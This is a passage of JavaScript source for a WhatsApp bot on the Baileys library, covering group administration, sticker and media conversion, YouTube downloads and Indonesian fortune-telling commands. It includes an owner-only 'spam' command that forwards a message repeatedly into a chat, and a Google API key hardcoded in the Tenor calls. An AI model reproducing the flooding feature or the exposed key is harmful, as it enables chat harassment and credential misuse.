await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)

if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//

case 'penjara':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
m.reply(teks)
break
case 'setppbot': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var media = await haikal.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await haikal.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await haikal.updateProfilePicture(botNumber, { url: media }) }
m.reply(mess.success)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await haikal.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await haikal.updateProfilePicture(m.chat, { url: media }) }
m.reply(mess.success)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: hw })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: hw })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from)
 // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
//=================================================//


//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} 
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } 
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
reply(`${haikal.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
reply(`${haikal.user.name} telah di unmute di group ini !`)
} 
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)

if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)

if (!m.quoted) reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)

if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)

 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)

 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)

let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)

if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./baseikal/lib/binary')
let eb = await eBinary(text)
reply(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./baseikal/lib/binary')
let db = await dBinary(text)
reply(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)

let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
 case 'attp': case 'ttp': {
 if (isBan) throw sticBanLu(from)

 if (!text) throw `Example : ${prefix + command} text`
 await haikal.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
case 'spam': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.quoted) return m.reply("Reply pesanya!")
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//=================================================//
 /*case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
 if (isBan) throw sticBanLu(from)

let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./baseikal/lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await haikal.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(FaTiH)
}
 break */
//=================================================// 
case 'smtreme': case 'stickeszxxrmeme': case 'stickmoiuytpeme': { 
if (isBan) throw sticBanLu(from)

if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: hw })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)

if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: hw })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)

if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)

if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : hw })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)

if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:hw})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)

if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: hw })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)

let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case 'yts': case 'ytsearch': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
haikal.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: hw })
}
break
//=================================================//
case 'google': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
//=================================================//


//=================================================//
case 'ytmp3': case 'ytaudio': {
if (isBan) throw sticBanLu(from)

let { yta } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
}
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (isBan) throw sticBanLu(from)

let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'getmusic': {
if (isBan) throw sticBanLu(from)

let { yta } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: hw })
}
break
//=================================================//
case 'getvideo': {
if (isBan) throw sticBanLu(from)

let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: hw })
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)

let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: hw })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)

let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: hw })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: hw })
}
break
//=================================================//

//=================================================//

//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)

if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
